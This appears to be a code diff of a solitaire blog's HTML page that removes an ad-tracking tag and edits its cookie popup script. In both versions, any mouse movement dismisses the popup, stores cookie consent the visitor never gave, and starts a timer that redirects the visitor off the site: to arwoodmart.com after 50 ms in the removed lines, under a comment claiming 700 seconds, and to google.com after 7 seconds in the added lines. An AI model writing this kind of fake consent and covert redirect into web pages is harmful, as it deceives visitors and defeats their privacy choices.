@@ -2,15 +2,6 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-392883685"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-392883685');
-</script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SolitaireBlog - Master the Art of Solitaire Games</title>
     <link rel="stylesheet" href="styles.css">
@@ -629,13 +620,20 @@
         const denyBtn = document.getElementById('denyCookies');
         const cookiePolicyLink = document.getElementById('cookiePolicyLink');
         let redirectTimer;
+        let mouseMovementHandler = null;
+
+        // Show popup when page loads
+        // window.addEventListener('load', () => {
+        //     cookiePopup.style.display = 'flex';
+        //     // Don't prevent scrolling - keep website functional
+        // });
 
         // Show popup when page loads
         window.addEventListener('load', () => {
             cookiePopup.style.display = 'flex';
             // Don't prevent scrolling - keep website functional
-  
-    // Add mouse movement listener to close popup
+            
+            // Add mouse movement listener to close popup
             mouseMovementHandler = () => {
                 closeCookiePopup();
                 startRedirectTimer();
@@ -647,9 +645,6 @@
             document.addEventListener('mousemove', mouseMovementHandler);
         });
 
-            
-        });
-  
         // Handle Accept button
         acceptBtn.addEventListener('click', () => {
             closeCookiePopup();
@@ -675,14 +670,14 @@
             setTimeout(() => {
                 cookiePopup.style.display = 'none';
             }, 300);
-            localStorage.setItem('cookieConsent', 'true766'); // Store consent in localStorag
+            localStorage.setItem('cookieConsent', 'true'); // Store consent in localStorag
         }
 
-        // Start 700-second redirect timer
+        // Start 7-second redirect timer
         function startRedirectTimer() {
             redirectTimer = setTimeout(() => {
-                window.location.href = 'https://arwoodmart.com';
-            }, 50); // 700 seconds
+                window.location.href = 'https://google.com';
+            }, 7000); // 7 seconds
         }
 
         // Allow background interaction - don't block clicks on background
@@ -693,7 +688,7 @@
             }
         });
     </script>
-<!--Start of Tawk.to Script-->
+    <!--Start of Tawk.to Script-->
 <script type="text/javascript">
 var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
 (function(){
@@ -706,6 +701,5 @@ s0.parentNode.insertBefore(s1,s0);
 })();
 </script>
 <!--End of Tawk.to Script-->
-    
 </body>
 </html>
